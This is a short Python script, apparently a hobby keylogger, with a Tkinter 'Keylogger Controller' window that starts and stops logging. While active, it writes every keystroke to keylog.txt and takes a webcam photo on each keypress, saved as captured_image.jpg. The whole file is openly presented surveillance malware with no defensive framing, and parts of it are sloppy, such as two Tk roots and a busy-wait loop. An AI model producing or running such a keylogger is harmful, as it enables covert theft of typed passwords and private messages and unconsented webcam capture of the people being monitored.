from pynput.keyboard import Key, Listener # type: ignore
import tkinter as tk
from tkinter import messagebox
import threading
import cv2 # type: ignore

frame = tk.Tk()
logging = False  

def start_logging():
    global logging
    if not logging:
        logging = True
        threading.Thread(target=start_keylogger).start()
    else:
        messagebox.showwarning("Warning", "Logging is already active!")
        messagebox.showerror("if hang")

def stop_logging():
    global logging
    logging = False

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        while logging:
            pass

def on_press(key):
    with open("keylog.txt", "a") as f:
        f.write(str(key) + "\n")
    capture_image()

def capture_image():
    cap = cv2.VideoCapture(0)  # Open the default camera
    ret, frame = cap.read()
    if ret:
        cv2.imwrite("captured_image.jpg", frame)  # Save the captured image
    cap.release()  # Release the camera

root = tk.Tk()
root.title("Keylogger Controller")
start_button = tk.Button(root, text="Start Logging", command=start_logging)
start_button.pack(pady=20)
stop_button = tk.Button(root, text="Stop Logging", command=stop_logging)
stop_button.pack(pady=20)
root.mainloop()
frame.mainloop()


